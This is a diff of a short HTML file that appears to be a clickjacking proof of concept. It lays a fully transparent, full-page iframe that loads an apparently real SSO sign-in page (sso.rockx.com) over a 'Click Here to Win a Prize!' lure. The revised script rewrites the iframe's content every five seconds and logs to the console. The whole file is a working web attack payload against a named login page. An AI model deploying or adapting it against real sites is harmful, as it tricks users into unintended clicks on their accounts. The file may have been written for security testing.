@@ -1,26 +1,36 @@
 <html>
-   <head>
-     <style>
-       #overlay {
-         position: absolute;
-         top: 0;
-         left: 0;
-         width: 100%;
-         height: 100%;
-         z-index: 9999;
-         opacity: 0;
-       }
-     </style>
-   </head>
-   <body>
-     <script>
-       var doc = document.getElementById('overlay').contentWindow.document;
-       doc.open();
-       doc.write('Test');
-       doc.close();
-     </script>
-     <iframe id="overlay"
-src="https://sso.rockx.com/signin?redirect_uri=https%3A%2F%2Faccess.rockx.com%2Fhome"></iframe>
-     <h1>Click Here to Win a Prize!</h1>
-   </body>
+
+<head>
+  <style>
+    #overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 9999;
+      opacity: 0;
+    }
+  </style>
+</head>
+
+<body>
+  <script>
+    setInterval(function () {
+      console.log('fn() called');
+
+      var doc = document.getElementById('overlay').contentWindow.document;
+      console.log('doc', doc);
+
+      doc.open();
+      doc.write('<a>click me</a>');
+      doc.close();
+
+      console.log('fn() done');
+    }, 5000);
+  </script>
+  <iframe id="overlay" src="https://sso.rockx.com/signin?redirect_uri=https%3A%2F%2Faccess.rockx.com%2Fhome"></iframe>
+  <h1>Click Here to Win a Prize!</h1>
+</body>
+
 </html>
